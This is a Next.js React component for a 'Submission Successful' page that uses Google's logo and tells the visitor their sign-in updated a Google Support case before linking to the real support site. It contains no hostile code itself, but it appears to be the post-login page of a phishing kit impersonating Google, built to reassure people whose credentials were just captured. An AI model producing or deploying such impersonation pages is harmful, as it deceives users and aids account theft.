import Link from 'next/link';

   export default function Success() {
     return (
       <div className="min-h-screen flex items-center justify-center bg-white text-black">
         <div className="bg-white p-6 rounded-lg border border-gray-300 w-96 text-center">
           <div className="flex justify-center mb-4">
             <img
               src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
               alt="Google Logo"
               className="h-8"
             />
           </div>
           <h2 className="text-xl font-normal mb-2">Submission Successful</h2>
           <p className="text-sm text-gray-600 mb-6">
             Thank you for signing in. Your Google Support case has been updated.
           </p>
           <Link
             href="https://support.google.com/"
             className="text-blue-600 text-sm hover:underline"
           >
             Return to Google Support
           </Link>
         </div>
       </div>
     );
   }